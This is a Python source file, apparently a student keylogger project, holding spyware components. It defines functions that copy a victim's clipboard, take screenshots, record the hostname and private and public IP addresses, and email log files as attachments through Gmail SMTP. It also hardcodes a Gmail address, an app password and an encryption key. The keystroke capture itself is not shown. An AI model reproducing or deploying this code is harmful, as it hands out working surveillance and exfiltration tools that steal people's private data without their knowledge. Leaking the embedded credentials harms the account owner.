
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

import time
import os

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#variable declaration for email
email_address = "keyclog@gmail.com"
password = "zplhvxysqwztdygc"
to_addr = "keyclog@gmail.com"

# variable declaration for keylog
key_log = "log.txt"
file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
extend = "\\"

# variable declarations for system info
system_info = "system.txt"

# variable declaration for clipboard
clipboard_info = "clipboard.txt"

# variable declaration for screenshot
screenshot_info = "screenshot.png"

# decrypt variable declaration
key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="

# sending email functionality 
def send_email(filename, attachment, toaddr):
    from_addr = email_address
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Key Logs"
    body = "Information provided in attachemnt below"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" %filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    # creating a secure session to send email
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, to_addr, text)
    # end the session
    s.quit()

#send_email(key_log, file_path + extend + key_log, to_addr)

# grabbing computer information function
def comp_info():
    with open(file_path + extend + system_info ,"a") as file:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        # grabbing public ip address
        try:
            public_ip = get("https://api.ipify.org").text
            file.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            file.write("Public IP Address not found")

        file.write("Processor: " + (platform.processor()) + "\n")
        file.write("System: " + platform.system() + " " + platform.version() + "\n") 
        file.write("Machine: " + platform.machine() + "\n")
        file.write("Hostname: " + hostname + "\n")
        file.write("Private IP Address: " + ip_addr)

# paste the users clipboard data onto a file
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write("Clipboard Data: \n" + data)
        except:
            file.write("Clipboard can not be copied")

# grab a shot of the users screen
def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_info)
